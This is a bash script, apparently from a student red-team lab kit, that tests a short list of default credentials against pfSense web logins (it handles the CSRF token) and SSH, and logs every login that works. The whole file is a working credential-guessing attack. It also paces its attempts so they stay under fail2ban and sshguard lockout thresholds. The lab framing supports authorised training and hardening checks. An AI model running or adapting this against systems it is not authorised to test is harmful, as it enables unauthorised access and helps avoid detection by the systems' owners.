#!/usr/bin/env bash
# 02-default-creds.sh — Attack 2 (Credential guessing), scoped to DEFAULTS only.
# Authorised IRTX use only.
#
# This is a *default-credential check*, NOT a brute force. Your teacher is right
# that rockyou+hydra won't move a hardened box. The realistic win is a group that
# forgot to swap a default after the group build (everyone used P@ssword1), or a
# stock pfSense/kali image left as-is. So this tries a TINY, fixed list of the
# obvious defaults — one attempt each — and reports what answered.
#
# Why tiny matters: ≤4 tries per service stays under a 5-in-10-min fail2ban/
# sshguard threshold, so you learn the answer without getting your box banned.
#
# Covers:
#   • pfSense web GUI  (handles the CSRF token; default admin/pfsense, + P@ssword1)
#   • SSH              (only if the server actually offers password auth)
set -uo pipefail
cd "$(dirname "$0")"
source ./lib.sh

need curl "apt install curl"
command -v sshpass >/dev/null 2>&1 || warn "sshpass missing (apt install sshpass) — SSH checks will be skipped"

mapfile -t TARGETS < <(load_targets "${1:-targets.txt}")
require_targets

# ── Default credentials to test. Edit this list; keep it SHORT. ─────────────
# user:pass — the known defaults for this cohort plus stock images.
CREDS=(
  "admin:pfsense"      # stock pfSense
  "admin:P@ssword1"    # the cohort's build password
  "root:P@ssword1"
  "kali:kali"          # stock Kali, in case a group exposed one
)
PORTS_WEB=(443 8443 80)
WEBLOG="${RUN_DIR}/default-creds.txt"; : > "$WEBLOG"
rec(){ printf '%s\n' "$*" | tee -a "$WEBLOG"; }

# ── pfSense GUI login: GET to grab the __csrf_magic, then one POST ───────────
try_pfsense() {
  local url="$1" user="$2" pass="$3" jar page csrf code
  jar="$(mktemp)"
  page="$(curl -sk -c "$jar" "$url/index.php" 2>/dev/null)" || { rm -f "$jar"; return 2; }
  # pfSense anti-CSRF token lives in a hidden field; grab it verbatim.
  csrf="$(sed -n 's/.*name=.__csrf_magic. value="\([^"]*\)".*/\1/p' <<<"$page" | head -1)"
  code="$(curl -sk -o /dev/null -w '%{http_code}' -b "$jar" -c "$jar" \
          --data-urlencode "__csrf_magic=${csrf}" \
          --data-urlencode "usernamefld=${user}" \
          --data-urlencode "passwordfld=${pass}" \
          --data-urlencode "login=Sign In" \
          "$url/index.php" 2>/dev/null)"
  rm -f "$jar"
  # A good login redirects (302) to the dashboard; a bad one re-renders 200.
  [[ "$code" == "302" ]] && return 0 || return 1
}

for t in "${TARGETS[@]}"; do
  line; log "Default-cred check → $t"

  # --- Web GUIs ---
  for p in "${PORTS_WEB[@]}"; do
    scheme=https; [[ "$p" == 80 ]] && scheme=http
    url="${scheme}://${t}:${p}"
    # Is there a pfSense login page here at all?
    if curl -sk --connect-timeout 4 "$url/index.php" 2>/dev/null | grep -qi 'pfSense\|__csrf_magic'; then
      ok "  pfSense GUI detected on $p"
      for c in "${CREDS[@]}"; do
        u="${c%%:*}"; pw="${c#*:}"
        if try_pfsense "$url" "$u" "$pw"; then
          rec "FINDING  $t:$p  pfSense GUI  DEFAULT CREDENTIAL WORKS → ${u}/${pw}"
          warn "  >>> $u/$pw ACCEPTED on $t:$p  (screenshot this!)"
          break
        else
          log "    $u/$pw rejected"
        fi
        sleep 1
      done
    fi
  done

  # --- SSH, only if password auth is on offer ---
  if command -v sshpass >/dev/null 2>&1; then
    auths="$(ssh -o BatchMode=yes -o ConnectTimeout=4 -o StrictHostKeyChecking=no \
             -o PreferredAuthentications=none "nobody@${t}" 2>&1 || true)"
    if grep -qi 'password' <<<"$auths"; then
      ok "  SSH offers password auth — testing defaults"
      for c in "${CREDS[@]}"; do
        u="${c%%:*}"; pw="${c#*:}"
        if sshpass -p "$pw" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
             -o PreferredAuthentications=password -o NumberOfPasswordPrompts=1 \
             "${u}@${t}" 'id; hostname' >/dev/null 2>&1; then
          rec "FINDING  $t:22  SSH  DEFAULT CREDENTIAL WORKS → ${u}/${pw}"
          warn "  >>> SSH $u/$pw ACCEPTED on $t  (screenshot this!)"
          break
        else
          log "    ssh $u/$pw rejected"
        fi
        sleep 2
      done
    else
      log "  SSH is key-only (no password auth) — nothing to guess. Good hardening."
    fi
  fi
done

line
if grep -q '^FINDING' "$WEBLOG" 2>/dev/null; then
  warn "Default credentials found — see $WEBLOG"
else
  ok "No default credentials accepted. Expected outcome against a proper build."
  echo "No default credentials accepted on any target — $(date)" >> "$WEBLOG"
fi
ok "Evidence: $WEBLOG"
